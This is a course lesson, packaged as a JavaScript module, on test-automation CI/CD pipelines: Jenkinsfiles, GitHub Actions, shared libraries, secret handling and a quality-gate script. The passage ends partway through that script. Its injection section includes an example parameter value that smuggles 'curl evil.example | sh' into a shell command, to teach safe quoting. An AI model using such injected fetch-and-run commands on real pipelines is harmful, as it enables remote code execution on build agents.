export default {
  slug: 'framework-deep-jenkins-ci-cd-pipelines',
  category: 'framework',
  order: 15,
  title: 'Deep dive: CI/CD pipelines for test automation — Jenkins, GitHub Actions and quality gates',
  minutes: 35,
  summary: 'Design and defend a test pipeline — which suite runs where and what it blocks, Jenkins internals (controller, agents, CPS, declarative vs scripted), complete Jenkinsfiles for Java and Playwright, shared libraries, multibranch and webhooks, secret-safe shell steps, one GitHub Actions workflow with an aggregated gate, a quality-gate script with quarantine, flaky policy, speed-up arithmetic, CI-only failures and pipeline security.',
  manualAnalogy: `A manual release has entry and exit criteria: smoke before regression, sign-off before production, evidence for every decision, and someone who may say stop. A pipeline is that release process written as code and executed on every change. Its value depends on the same things as before — honest criteria, a trustworthy environment and reports that people read.`,
  body: `## Where the earlier lessons stop

\`framework-command-line-and-ci\` covered Maven commands, headless runs, a first Jenkinsfile with \`post { always }\`, a first workflow, schedules and a small matrix. Already covered in depth elsewhere:

- Playwright config, sharding and a Playwright-only GitHub Actions workflow and Jenkinsfile: \`pw-deep-config-environments-ci\`.
- Cucumber shards, dry-run gate and rerun files in CI: \`cucumber-deep-execution-reporting-parallel\`.
- Surefire/Failsafe semantics, caching flags and the wrapper: \`framework-deep-maven-build-internals\`.
- Flaky root causes and reproducing CI-only failures: \`selenium-deep-troubleshooting-flaky-tests\`; containers: the next lesson, \`framework-deep-docker-for-test-automation\`.

This lesson is about the **pipeline as a system**: what runs when, what may stop a release, how Jenkins executes your Groovy, how to build one gate over two stacks, and how to keep it fast, honest and secure.

The examples assume a typical monorepo: ShopEasy in the root (\`npm run dev\` on 5180, \`npm run api\` on 5181), a Maven suite (TestNG 7 + Cucumber-JVM 7 + Selenium 4) in \`tests-java/\`, a Playwright suite in \`tests-pw/\`, scripts in \`ci/\`. (The app's real repository has one workflow, \`.github/workflows/deploy-pages.yml\`: check content, build, deploy to GitHub Pages — continuous deployment with a small gate.)

## 1. CI, continuous delivery, continuous deployment

| | Continuous integration | Continuous delivery | Continuous deployment |
|---|---|---|---|
| Promise | every merge is built and tested automatically, several times a day | every green build **could** be released at any time | every green build **is** released |
| Human decision | code review | pressing the release button | none after merge |
| What it demands of tests | a fast, trusted PR gate | automated regression on a production-like environment, repeatable deploys | all of that + feature flags, canary, monitoring, automatic rollback |
| Typical failure | long-lived branches with a nightly build called "CI" | manual regression as the hidden stage | the suite is flaky, so people bypass it |

The question behind the question: *what must be true for us to release without a manual regression?* The answer is never "more UI tests", but a fast gate people trust, environments that resemble production, observability, and a rollback that is tested.

## 2. Pipeline stages: which suite runs where

\`\`\`text
commit/PR ──► build + static ──► unit/contract ──► API ──► smoke UI ──► MERGE
                (2 min)           (3 min)         (4 min)  (5 min)       │
                                                                         ▼
   build ONE artifact/image ──► deploy QA ──► regression (API + UI, sharded) ──► deploy staging
                                                                                     │
      nightly: full cross-browser, visual, accessibility, migration        E2E smoke + perf check
                                                                                     ▼
                                          approval (delivery) ──► production ──► read-only smoke ──► monitor
\`\`\`

| Stage | What runs | Budget | Blocks? | If it fails |
|---|---|---|---|---|
| Pull request | compile, lint, unit, contract, API, smoke UI on one browser | ≤ 10 min | merge | author fixes before review |
| Merge to main | API + core UI regression, sharded | ≤ 25 min | promotion to staging | stop the line: revert or fix within the hour |
| Nightly | all browsers, long journeys, visual, quarantine | ≤ 60 min | no, but triaged by 10:00 | ticket with an owner |
| Staging deploy | critical journeys with real integrations | ≤ 15 min | production | roll back staging, investigate |
| Production | read-only smoke, synthetic monitoring | ≤ 5 min | triggers rollback | rollback first, analysis second |

Rules that separate a pipeline from a list of jobs:

1. **Build once, promote the same artifact.** Rebuilding per environment means production runs something you never tested.
2. **Order by information per minute.** Checks that fail often and run fast go first. A 20-minute E2E stage behind a compile error wastes an agent.
3. **A gate must have an owner and a time budget.** A gate nobody maintains gets bypassed.
4. **The environment is an input.** Check its health and version *before* the suite, and print both commits (app, tests) in the report.

## 3. Jenkins internals that explain the behaviour

### Controller, agents, executors, labels

- The **controller** stores configuration, credentials and build records, serves the UI, schedules work and interprets pipeline Groovy. An **agent** is a machine (VM, container, Kubernetes pod) connected over inbound TCP/WebSocket or SSH that runs the steps. An **executor** is one slot on an agent; a **label** (\`linux && java17\`) says what it can do.
- **Why not build on the controller:** a build there can read \`JENKINS_HOME\` (credentials store, secrets key, other jobs' configuration), and load from tests slows every team's Jenkins. Set the built-in node to 0 executors. Security, then stability.
- **Executor arithmetic:** 4 parallel cells each with 4 browsers on an agent with 4 executors = 16 browsers on one box. Use one executor per UI agent, or labels that reflect capacity.
- A \`pipeline { agent any }\` with nested \`agent\` blocks takes **two** executors: the outer one sits idle holding a slot. A few concurrent builds can deadlock a small Jenkins. Use \`agent none\` at the top when stages have their own agents.

### How pipeline Groovy runs: CPS

Your Jenkinsfile does **not** run on the agent. It runs on the controller in a *continuation-passing-style* interpreter: after each step, the program state is serialised to disk. That is why a running pipeline survives a controller restart, and why:

- Local variables held across a step must be **serialisable**: keeping a \`Matcher\` or a \`JsonSlurper\` result gives \`java.io.NotSerializableException\`. Use \`readJSON\` (Pipeline Utility Steps plugin), or a \`@NonCPS\` method that contains **no pipeline steps**.
- Heavy Groovy (parsing a 50 MB report) burns controller CPU. Do it in a shell/Node/Java script **on the agent**; keep the Jenkinsfile an orchestrator.
- \`sh\` starts a *durable task*: a wrapper process on the agent writes output and exit code to files, which the controller polls. So tests keep running while the controller restarts; and \`wrapper script does not seem to be touching the log file\` means that the process vanished (agent rebooted, OOM-killed container).

### Declarative vs scripted

| | Declarative (\`pipeline {}\`) | Scripted (\`node {}\`) |
|---|---|---|
| How it works | structured model, validated before the run | Groovy DSL, imperative |
| Advantages | readable, linted, \`post\`, \`when\`, \`matrix\`, \`options\`; restart from stage | full control flow, dynamic stages |
| Disadvantages | dynamic shapes need \`script {}\` | \`try/finally\` everywhere; easy to write unreadable programs; errors appear late |
| Performance | same engine | same engine |
| Maintainability | high | depends on discipline |
| Scalability | good with shared libraries | good only inside shared libraries |
| When to use | every Jenkinsfile | inside libraries, for generated parallel branches |

**Recommended:** declarative Jenkinsfile with small calls, logic in a shared library or in scripts under \`ci/\` that also run on a laptop. If a \`script {}\` block grows past ten lines, move it.

## 4. A full declarative Jenkinsfile: Java, Selenium, Cucumber, TestNG

### The Maven side it relies on

\`\`\`xml
<!-- tests-java/pom.xml (excerpt): one property selects the TestNG suite file -->
<properties>
  <suite>smoke</suite>
  <browser>chrome</browser>
  <headless>true</headless>
</properties>
...
<plugin>
  <groupId>org.apache.maven.plugins</groupId>
  <artifactId>maven-failsafe-plugin</artifactId>
  <version>3.5.4</version>   <!-- suiteXmlFiles is not supported from 3.6: keep the 3.5.x pin -->
  <configuration>
    <suiteXmlFiles>
      <suiteXmlFile>src/test/resources/suites/\${suite}.xml</suiteXmlFile>
    </suiteXmlFiles>
    <systemPropertyVariables>
      <browser>\${browser}</browser>
      <headless>\${headless}</headless>
    </systemPropertyVariables>
  </configuration>
  <executions>
    <execution>
      <goals><goal>integration-test</goal><goal>verify</goal></goals>
    </execution>
  </executions>
</plugin>
\`\`\`

The suite XML lists TestNG classes and the Cucumber TestNG runner. Cucumber tags come from the environment variable \`CUCUMBER_FILTER_TAGS\` (Cucumber maps its property names to environment variables), so no tag expression has to survive shell quoting.

### The start script (works on a laptop too)

\`\`\`bash
#!/usr/bin/env bash
# ci/start-shopeasy.sh: web 5180 + API 5181, returns when both answer
set -euo pipefail
npm ci --no-audit --no-fund
nohup npm run api > shopeasy-api.log 2>&1 &
nohup npm run dev -- --host 0.0.0.0 --strictPort > shopeasy-web.log 2>&1 &

for url in http://localhost:5181/api/health http://localhost:5180/practice-site/login.html; do
  curl --fail --silent --show-error --output /dev/null \\
       --retry 30 --retry-delay 1 --retry-connrefused "$url" \\
    || { echo "not up: $url"; tail -n 50 shopeasy-*.log; exit 1; }
done
\`\`\`

\`--strictPort\` matters: without it Vite silently moves to 5181 or the next free port when 5180 is taken, and you test someone else's server.

### The Jenkinsfile

\`\`\`groovy
// Jenkinsfile
pipeline {
  agent none

  parameters {
    choice(name: 'SUITE', choices: ['smoke', 'regression'], description: 'TestNG suite file')
    string(name: 'TAGS', defaultValue: 'not @wip and not @quarantine', description: 'Cucumber tag expression')
  }

  triggers {
    cron(env.BRANCH_NAME == 'main' ? 'H 1 * * 1-5' : '')      // nightly on main only; H spreads the load
  }

  options {
    timeout(time: 90, unit: 'MINUTES')
    timestamps()
    disableConcurrentBuilds()
    buildDiscarder(logRotator(numToKeepStr: '30', artifactNumToKeepStr: '10'))
    skipDefaultCheckout()                                      // explicit checkout per stage, see below
  }

  stages {
    stage('Build and static checks') {
      agent { label 'linux && java17' }
      options { timeout(time: 10, unit: 'MINUTES') }
      steps {
        checkout scm
        retry(2) { sh 'mvn -B -f tests-java/pom.xml dependency:go-offline' }   // network only, never tests
        sh 'mvn -B -f tests-java/pom.xml -DskipTests test-compile'
      }
    }

    stage('Fast gate') {
      parallel {
        stage('API') {
          agent { label 'linux && java17 && node' }
          options { timeout(time: 15, unit: 'MINUTES') }
          steps { checkout scm; sh 'ci/start-shopeasy.sh'; runSuite(suite: 'api', browser: 'none') }
          post { always { publishResults('api') } }
        }
        stage('Smoke UI') {
          agent { label 'linux && java17 && node && browsers' }
          options { timeout(time: 15, unit: 'MINUTES') }
          steps { checkout scm; sh 'ci/start-shopeasy.sh'; runSuite(suite: 'smoke', browser: 'chrome') }
          post { always { publishResults('smoke-chrome') } }
        }
      }
    }

    stage('Regression') {
      when {
        beforeAgent true
        anyOf { triggeredBy 'TimerTrigger'; expression { params.SUITE == 'regression' } }
      }
      matrix {
        axes {
          axis { name 'BROWSER'; values 'chrome', 'firefox' }
          axis { name 'AREA';    values 'cart', 'checkout' }
        }
        agent { label 'linux && java17 && node && browsers' }
        options { timeout(time: 45, unit: 'MINUTES') }
        stages {
          stage('Run') {
            steps {
              checkout scm
              sh 'ci/start-shopeasy.sh'
              runSuite(suite: "regression-\${AREA}", browser: BROWSER)
            }
          }
        }
        post { always { publishResults("\${AREA}-\${BROWSER}") } }
      }
    }

    stage('Deploy to staging') {
      when { beforeInput true; branch 'main'; not { triggeredBy 'TimerTrigger' } }
      input { message 'Promote this build to staging?'; submitter 'release-managers' }
      agent { label 'deploy' }
      steps {
        lock(resource: 'shopeasy-staging') {                   // Lockable Resources plugin
          checkout scm
          sh 'ci/deploy.sh staging "$GIT_COMMIT"'              // illustrative deploy script
        }
      }
    }
  }

  post {
    always {
      node('linux') {
        script {
          ['api', 'smoke-chrome', 'cart-chrome', 'cart-firefox', 'checkout-chrome', 'checkout-firefox'].each { name ->
            try { unstash "allure-\${name}" } catch (ignored) { echo "no results from \${name}" }
          }
        }
        allure includeProperties: false, jdk: '', results: [[path: 'tests-java/target/allure-results']]
      }
    }
    regression { notifyTeam('newly failing') }
    fixed      { notifyTeam('back to green') }
    cleanup    { echo "done: \${currentBuild.currentResult}" }
  }
}

// ---- helpers: candidates for a shared library ----
void runSuite(Map cfg) {
  withCredentials([usernamePassword(credentialsId: 'shopeasy-ui-user',
                                    usernameVariable: 'SHOP_USER', passwordVariable: 'SHOP_PASS')]) {
    withEnv(["SUITE=\${cfg.suite}", "BROWSER_NAME=\${cfg.browser}", "CUCUMBER_FILTER_TAGS=\${params.TAGS}"]) {
      sh 'mvn -B -f tests-java/pom.xml clean verify -Dsuite="$SUITE" -Dbrowser="$BROWSER_NAME" -Dheadless=true'
    }
  }
}

void publishResults(String name) {
  archiveArtifacts artifacts: 'tests-java/target/screenshots/**, shopeasy-*.log', allowEmptyArchive: true
  stash name: "allure-\${name}", includes: 'tests-java/target/allure-results/**', allowEmpty: true
  junit testResults: 'tests-java/target/failsafe-reports/*.xml'    // last: no results at all must fail the stage
}

void notifyTeam(String what) {
  emailext subject: "ShopEasy \${env.BRANCH_NAME} \${what}: #\${env.BUILD_NUMBER}",
           body: "\${env.BUILD_URL}", to: 'qa-team@example.com'  // Email Extension plugin
}
\`\`\`

### Step by step

- **\`agent none\` + agents per stage:** nothing idles. The \`input\` stage resolves before an agent is taken, so a forgotten approval does not block an executor overnight — but it does keep the build running, hence the outer \`timeout\`.
- **\`skipDefaultCheckout()\`** stops Declarative's automatic checkout; we do one \`checkout scm\` in each stage. In a parallel build every agent must check out the **same** commit: \`checkout scm\` in a multibranch build does.
- **\`when { beforeAgent true }\`** evaluates the condition before waiting for a browser agent. The matrix builds 2 × 2 cells, each with its own agent and workspace (two Maven runs must never share one \`target/\`). Use \`excludes { exclude { … } }\` to drop meaningless combinations.
- **\`disableConcurrentBuilds()\`** queues builds of the same branch. For PR jobs \`disableConcurrentBuilds(abortPrevious: true)\` cancels the outdated run.
- **\`withCredentials\`** binds secrets to environment variables only inside the block, masks them in the log, and the single-quoted \`sh\` lets the *shell* expand. Section 7 explains why this is not a style preference.
- **\`publishResults\` in \`post { always }\` of each stage**, on the agent where the files are. A top-level \`post\` with \`agent none\` has no workspace, which is why the Allure step opens a \`node\`.
- **Allure once, at the end.** Calling \`allure\` in every cell would publish a report per cell; stashing result files (their names are UUID-based, so they do not collide) and unstashing gives one report. \`stash\` travels through the controller, so keep it to small files; put videos in \`archiveArtifacts\` or object storage.
- **\`post\` order** is fixed: \`always\`, \`changed\`, \`fixed\`, \`regression\`, \`aborted\`, \`failure\`, \`success\`, \`unstable\`, \`unsuccessful\`, \`cleanup\`. \`regression\`/\`fixed\` notify on *state changes*, which keeps the channel readable.
- **UNSTABLE vs FAILURE:** \`sh\` fails the stage when Maven exits non-zero (FAILURE). \`junit\` alone marks UNSTABLE on test failures. If you ignore Maven's exit code, only \`junit\` decides — and \`skipMarkingBuildUnstable\` would leave nothing that does.

### Retry: infrastructure yes, tests no

\`\`\`groovy
// scripted form: a new agent if the old one died; a red test is NOT retried
retry(count: 2, conditions: [agent(), nonresumable()]) {
  node('linux && browsers') {
    checkout scm
    runSuite(suite: 'smoke', browser: 'chrome')
  }
}
\`\`\`

\`conditions\` restricts retries to lost agents and steps that could not resume after a restart. A plain \`options { retry(2) }\` around a test stage reruns 30 minutes of tests to hide one flaky check and doubles your cost exactly when the product is broken.

## 5. A Jenkinsfile for Playwright: docker agent, shards, merged report

\`\`\`groovy
pipeline {
  agent none
  options { timeout(time: 45, unit: 'MINUTES'); disableConcurrentBuilds() }
  stages {
    stage('E2E shards') {
      matrix {
        axes { axis { name 'SHARD'; values '1', '2', '3', '4' } }
        agent {
          docker { image 'mcr.microsoft.com/playwright:v1.64.1-noble'; label 'docker'; args '--ipc=host --init' }
        }
        environment { CI = 'true'; HOME = "\${WORKSPACE}" }     // a writable home for the npm cache
        stages {
          stage('Test') {
            steps {
              sh 'ci/start-shopeasy.sh'
              dir('tests-pw') {
                sh 'npm ci'
                catchError(buildResult: 'FAILURE', stageResult: 'FAILURE') {
                  sh 'npx playwright test --reporter=blob --shard="$SHARD/4"'
                }
              }
            }
          }
        }
        post {
          always { stash name: "blob-\${SHARD}", includes: 'tests-pw/blob-report/**', allowEmpty: true }
        }
      }
    }

    stage('Merge report') {
      agent { docker { image 'mcr.microsoft.com/playwright:v1.64.1-noble'; label 'docker'; args '--init' } }
      environment {
        HOME = "\${WORKSPACE}"
        PLAYWRIGHT_HTML_OPEN = 'never'
        PLAYWRIGHT_JUNIT_OUTPUT_FILE = 'results/junit.xml'
      }
      steps {
        script { (1..4).each { unstash "blob-\${it}" } }
        dir('tests-pw') {
          sh 'npm ci'
          sh 'npx playwright merge-reports --reporter=html,junit ./blob-report'
        }
      }
      post {
        always {
          junit testResults: 'tests-pw/results/junit.xml', allowEmptyResults: true
          archiveArtifacts artifacts: 'tests-pw/playwright-report/**', allowEmptyArchive: true
        }
      }
    }
  }
}
\`\`\`

- **\`agent { docker }\`** makes Jenkins run \`docker run\` on a node labelled \`docker\`, mount the workspace and execute \`sh\` steps inside as the Jenkins user's uid — hence the \`HOME\` override. The image holds browsers; \`@playwright/test\` comes from \`npm ci\`.
- **\`catchError\`** marks stage and build FAILED but lets the pipeline continue, so *Merge report* runs. Without it, the failing matrix would skip the report in exactly the runs where you need it.
- The shards start ShopEasy themselves, so the Playwright config must not also start it: a \`webServer\` with \`reuseExistingServer: !process.env.CI\` would fail with "port already used". Choose one mechanism.
- Blob file names contain the shard number, so four stashes can be unpacked into one \`blob-report/\` directory.
- The image tag must equal the \`@playwright/test\` version in the lock file. It appears twice as a literal here; a shared-library step that takes the version is the clean way to keep it in one place.

## 6. Shared libraries, multibranch and triggers

### Shared library

Forty Jenkinsfiles with the same 60 lines are forty places to fix. A shared library is a Git repository:

\`\`\`text
jenkins-qa-lib/
  vars/uiSuite.groovy        # a global step: the file name is the step name
  src/com/shopeasy/ci/...    # classes
  resources/...              # non-Groovy files, read with libraryResource
\`\`\`

\`\`\`groovy
// vars/uiSuite.groovy
def call(Map cfg = [:]) {
  def suite   = cfg.suite ?: error('uiSuite: "suite" is required')
  def browser = cfg.browser ?: 'chrome'
  withCredentials([usernamePassword(credentialsId: cfg.credentialsId ?: 'shopeasy-ui-user',
                                    usernameVariable: 'SHOP_USER', passwordVariable: 'SHOP_PASS')]) {
    withEnv(["SUITE=\${suite}", "BROWSER_NAME=\${browser}"]) {
      sh 'mvn -B -f tests-java/pom.xml clean verify -Dsuite="$SUITE" -Dbrowser="$BROWSER_NAME"'
    }
  }
}
\`\`\`

\`\`\`groovy
@Library('jenkins-qa-lib@2.3.0') _          // pin a tag: a moving branch breaks every team at once
pipeline {
  agent { label 'linux && browsers' }
  stages { stage('Smoke') { steps { uiSuite suite: 'smoke' } } }
}
\`\`\`

Facts interviewers like: a **global trusted** library runs outside the Groovy sandbox, so write access to its repository is nearly admin access to Jenkins — protect it like production code; folder-level libraries are always untrusted (sandboxed). A whole \`pipeline {}\` may live in a \`call\` method (one per build), giving teams a three-line Jenkinsfile. Calling a *method on* a library variable (\`log.info\`) in Declarative needs a \`script\` block.

### Multibranch and triggers

A **multibranch pipeline** (or organisation folder) discovers branches and PRs, creates a job per branch from the Jenkinsfile in it, and deletes it when the branch goes. PR builds usually test the *merge* of PR and target. \`CHANGE_ID\` is set only for PR builds, \`BRANCH_NAME\` for all.

| | Webhook | Polling (\`pollSCM('H/5 * * * *')\`) | Schedule (\`cron\`) | Upstream |
|---|---|---|---|---|
| How | Git server calls Jenkins | Jenkins asks Git | time | another job |
| Latency | seconds | up to the interval | — | immediate |
| Cost | none | many idle requests | — | — |
| Needs | Jenkins reachable from the Git server | only outbound access | — | — |
| When | default | Jenkins behind a firewall (or a slow poll as safety net) | nightly | separate test repository |

**Recommended:** webhooks plus a daily branch scan as a safety net.

With tests in a separate repository, the app pipeline triggers them and waits:

\`\`\`groovy
build job: 'shopeasy-e2e/main', wait: true, propagate: true,
      parameters: [string(name: 'APP_VERSION', value: env.GIT_COMMIT), string(name: 'SUITE', value: 'smoke')]
\`\`\`

\`propagate: false\` returns the result for your own decision; \`wait: false\` is "fire and forget" — and then it is not a gate.

## 7. Strings, shells and leaked secrets

\`\`\`groovy
sh "curl -H 'Authorization: Bearer \${API_TOKEN}' https://qa.example.com/api/orders"   // WRONG
sh 'curl -H "Authorization: Bearer $API_TOKEN" https://qa.example.com/api/orders'     // right
\`\`\`

In the first, **Groovy** replaces the variable on the controller before the agent sees the command: the secret becomes part of the command line (visible in \`ps\`), of the generated script file, and — if a character is transformed — escapes log masking. Jenkins prints a warning about interpolating secrets. In the second the *shell* reads the environment variable.

The same rule is an **injection** defence:

\`\`\`groovy
sh "mvn verify -Dcucumber.filter.tags='\${params.TAGS}'"   // TAGS = "x'; curl evil.example | sh; '"
withEnv(["CUCUMBER_FILTER_TAGS=\${params.TAGS}"]) { sh 'mvn -B verify' }   // safe: data, not code
\`\`\`

Build parameters, branch names (a branch may contain \`$(…)\`), commit messages and PR titles are user input. GitHub Actions has the identical problem: an expression in \`run:\` is pasted into the script before the shell starts, so \`run: echo "\${{ github.event.pull_request.title }}"\` executes a title such as \`"; curl …\`. Pass it through \`env:\` and use \`"$TITLE"\`.

Masking is a **seat belt**: it replaces known strings in the console. Base64 of the secret, a JSON-escaped variant, a screenshot showing the password, or the value inside an archived HTML report are not masked. Use low-privilege test accounts, and mask in the framework too (the \`typeSecret\` idea in \`selenium-deep-framework-design\`).

## 8. GitHub Actions: one quality workflow for both stacks

\`\`\`yaml
# .github/workflows/quality.yml
name: quality
on:
  pull_request:
    branches: [main]
  merge_group:                        # run for the merge queue too, or required checks never report
  schedule:
    - cron: '0 1 * * 1-5'             # UTC
  workflow_dispatch:
    inputs:
      suite: { type: choice, options: [smoke, regression], default: smoke }

permissions:
  contents: read                      # everything not listed becomes "none"

concurrency:
  group: quality-\${{ github.workflow }}-\${{ github.ref }}
  cancel-in-progress: \${{ github.event_name == 'pull_request' }}

env:
  SUITE: \${{ inputs.suite || (github.event_name == 'schedule' && 'regression') || 'smoke' }}

jobs:
  static:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-java@v6
        with: { distribution: temurin, java-version: '17', cache: maven }
      - uses: actions/setup-node@v7
        with: { node-version: lts/*, cache: npm, cache-dependency-path: '**/package-lock.json' }
      - run: mvn -B -f tests-java/pom.xml -DskipTests test-compile
      - run: npm ci && npx tsc --noEmit
        working-directory: tests-pw

  ui-java:
    needs: static
    runs-on: ubuntu-latest
    timeout-minutes: 45
    strategy:
      fail-fast: false
      matrix:
        browser: [chrome, firefox]
    services:
      selenium:
        image: selenium/standalone-\${{ matrix.browser }}:4.54.0-20261124
        ports: ['4444:4444']
        options: >-
          --shm-size=2g
          --add-host=host.docker.internal:host-gateway
          --health-cmd "/opt/bin/check-grid.sh --host 0.0.0.0 --port 4444"
          --health-interval 5s --health-timeout 10s --health-retries 12
    env:
      BROWSER: \${{ matrix.browser }}
      GRID_URL: http://localhost:4444                                  # the JVM runs on the runner
      BASE_URL: http://host.docker.internal:5180/practice-site/        # the BROWSER runs in a container
      __VITE_ADDITIONAL_SERVER_ALLOWED_HOSTS: host.docker.internal     # Vite's Host-header check
      SHOP_PASS: \${{ secrets.SHOP_PASS }}
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with: { node-version: lts/*, cache: npm }
      - uses: actions/setup-java@v6
        with: { distribution: temurin, java-version: '17', cache: maven }
      - run: bash ci/start-shopeasy.sh
      - name: Run suite (the gate script below decides)
        run: mvn -B -f tests-java/pom.xml clean verify -Dsuite="$SUITE" -Dbrowser="$BROWSER" -Dmaven.test.failure.ignore=true
      - name: Gate
        if: \${{ !cancelled() }}
        run: node ci/quality-gate.mjs --min-tests=40 --max-flaky=3 tests-java/target/failsafe-reports
      - uses: actions/upload-artifact@v7
        if: \${{ !cancelled() }}
        with:
          name: java-\${{ matrix.browser }}-attempt-\${{ github.run_attempt }}
          path: |
            tests-java/target/failsafe-reports/
            tests-java/target/screenshots/
            shopeasy-*.log
          retention-days: 14

  ui-playwright:
    needs: static
    runs-on: ubuntu-latest
    timeout-minutes: 30
    strategy:
      fail-fast: false
      matrix:
        shard: [1, 2, 3, 4]
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with: { node-version: lts/*, cache: npm, cache-dependency-path: '**/package-lock.json' }
      - run: bash ci/start-shopeasy.sh
      - run: npm ci && npx playwright install --with-deps chromium
        working-directory: tests-pw
      - run: npx playwright test --project=chromium --reporter=blob --shard=\${{ matrix.shard }}/4
        working-directory: tests-pw
      - uses: actions/upload-artifact@v7
        if: \${{ !cancelled() }}
        with: { name: 'blob-report-\${{ matrix.shard }}', path: tests-pw/blob-report, retention-days: 1 }

  quality-gate:                       # the ONLY required check in branch protection
    if: \${{ always() }}
    needs: [static, ui-java, ui-playwright]
    runs-on: ubuntu-latest
    steps:
      - env:
          RESULTS: \${{ toJSON(needs) }}
        run: |
          echo "$RESULTS" | jq -r 'to_entries[] | "\\(.key): \\(.value.result)"' >> "$GITHUB_STEP_SUMMARY"
          echo "$RESULTS" | jq -e 'all(.[]; .result == "success")' > /dev/null

  deploy-qa:
    needs: quality-gate
    if: \${{ github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main' }}
    runs-on: ubuntu-latest
    environment: qa                   # environment secrets, required reviewers, branch rules
    concurrency: deploy-qa            # one deployment at a time
    steps:
      - uses: actions/checkout@v7
      - run: ci/deploy.sh qa "$GITHUB_SHA"          # illustrative
\`\`\`

**Step by step**

- **Concurrency:** a new push cancels the older *PR* run; scheduled runs are never cancelled.
- **Two network views.** The job runs on the runner, so the JVM reaches the service through the mapped port on \`localhost\`; the browser runs inside the service container, so *its* \`localhost\` is not the app. \`--add-host\` maps the host gateway, the start script binds Vite to all interfaces, and the environment variable lets Vite accept that Host header. Grid details: \`selenium-deep-grid-infrastructure\`.
- **Artifact names are unique** per matrix value *and* attempt: artifacts are immutable since v4 of the upload action and a second upload under the same name fails.
- **The aggregated \`quality-gate\` job** solves two problems: matrix jobs have changing names, and a job skipped by \`if:\` reports success to branch protection. \`if: always()\` plus checking every \`needs.*.result\` means "skipped" and "cancelled" are **not** green. If you use path filters, allow \`skipped\` explicitly for those jobs only.
- **\`-Dmaven.test.failure.ignore=true\` is acceptable only because the next step is a stricter gate** with a minimum test count (set per suite; 40 is an example). Without the gate it is the classic "green build, red tests".
- **Service containers need Linux runners.** Fork PRs receive no secrets (and a read-only token), so a job that needs \`SHOP_PASS\` must be skipped or use non-secret test data there.
- Action majors shown are those in the actions' READMEs at the time of writing; older lessons here show v4 to v6. Pin what your organisation approves (section 13).
- Merging the blob reports is the job shown in \`pw-deep-config-environments-ci\`. Reuse across repositories is a **reusable workflow** (\`on: workflow_call\`), the counterpart of a Jenkins shared library; a *composite action* reuses steps inside one job.

## 9. Which CI system?

| | Jenkins | GitHub Actions | GitLab CI | Azure DevOps Pipelines |
|---|---|---|---|---|
| How it works | self-hosted controller + agents, Groovy | YAML workflows, hosted or self-hosted runners | YAML, hosted or own runners, one integrated platform | YAML (or classic) pipelines, hosted or own agents |
| Advantages | unlimited flexibility, on-prem, plugins for everything | PR-native, marketplace, matrix and services built in | DAG with \`needs\`, merge trains, review apps, JUnit in merge requests | deep Azure and Boards integration, Test Plans, approvals on environments |
| Disadvantages | you run it: upgrades, plugins, security, backups | vendor; minutes cost; YAML limits | best only if you live in GitLab | verbose YAML; best inside Microsoft's stack |
| Test results | \`junit\`, Allure, HTML plugins, trends | artifacts, job summary, checks (third-party for trends) | \`artifacts:reports:junit\` in the MR | published test results, trends, analytics |
| Parallel UI tests | \`parallel\`, \`matrix\`, own agents | \`strategy.matrix\` | \`parallel\` / matrix | \`strategy: matrix\` / \`parallel\` |
| Scalability | as good as your operations | elastic | elastic with autoscaling runners | elastic |
| When to use | existing investment, on-prem, special hardware | code on GitHub | code on GitLab | Microsoft shops |

**Recommended:** the system that lives **where the code lives**, unless network isolation or devices force self-hosting. Keep the logic in scripts (\`ci/*.sh\`, Maven, npm), so the pipeline file is thin and a migration is days, not months.

## 10. Quality gates and the flaky policy

### Gates

| Gate | Signal | Typical rule | Danger |
|---|---|---|---|
| Build & static | compile, lint, type check, secret scan | zero errors | — |
| Tests | failed, executed count | 0 failed **and** at least N executed | without the minimum, an empty suite passes |
| Flaky budget | passed only on retry | ≤ 3, trend not rising | hiding defects by retrying |
| Coverage of changed code | diff coverage | ≥ 80 % on new lines (product unit tests) | chasing a global percentage |
| Performance | p95 of a short load | within 20 % of baseline | noisy shared environments |
| Security | dependencies, image | no new critical with a fix available | alert fatigue |
| Manual | approval | release manager | approval as a substitute for automation |

### A gate you can read: quality-gate.mjs

This script runs on the agent, has no dependencies, and works the same in every CI system.

\`\`\`js
// ci/quality-gate.mjs
// usage: node ci/quality-gate.mjs --min-tests=40 --max-flaky=3 tests-java/target/failsafe-reports [more dirs]
import { existsSync, readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'

const args = process.argv.slice(2)
const option = (name, fallback) => {
  const hit = args.find((a) => a.startsWith(\`--\${name}=\`))
  return hit ? Number(hit.split('=')[1]) : fallback
}
const minTests = option('min-tests', 1)
const maxFlaky = option('max-flaky', 0)
const dirs = args.filter((a) => !a.startsWith('--'))

// [{ "id": "CheckoutIT.totalsWithTax", "owner": "asha", "ticket": "SHOP-1412", "expires": "2026-12-15" }]
const quarantineFile = 'ci/quarantine.json'
const quarantine = existsSync(quarantineFile) ? JSON.parse(readFileSync(quarantineFile, 'utf8')) : []

const attribute = (text, name) => new RegExp(\`\\\\b\${name}="([^"]*)"\`).exec(text)?.[1] ?? ''
const testcase = /<testcase\\b((?:"[^"]*"|[^">])*?)(?:\\/>|>([\\s\\S]*?)<\\/testcase>)/g

const cases = []
for (const dir of dirs) {
  if (!existsSync(dir)) continue
  for (const file of readdirSync(dir).filter((f) => f.endsWith('.xml'))) {
    for (const [, attrs, body = ''] of readFileSync(join(dir, file), 'utf8').matchAll(testcase)) {
      const className = attribute(attrs, 'classname').split('.').pop()
      cases.push({
        id: \`\${className}.\${attribute(attrs, 'name')}\`,
        failed: /<(failure|error)\\b/.test(body),
        skipped: /<skipped\\b/.test(body),
        flaky: /<flaky(Failure|Error)\\b/.test(body),
      })
    }
  }
}

const today = new Date().toISOString().slice(0, 10)
const quarantined = new Set(quarantine.filter((q) => q.expires >= today).map((q) => q.id))
const executed = cases.filter((c) => !c.skipped)
const blocking = executed.filter((c) => c.failed && !quarantined.has(c.id))
const tolerated = executed.filter((c) => c.failed && quarantined.has(c.id))
const flaky = executed.filter((c) => c.flaky)
const expired = quarantine.filter((q) => q.expires < today)

const problems = []
if (executed.length < minTests) problems.push(\`only \${executed.length} tests ran, expected at least \${minTests}\`)
if (blocking.length) problems.push(\`\${blocking.length} failed: \${blocking.map((c) => c.id).join(', ')}\`)
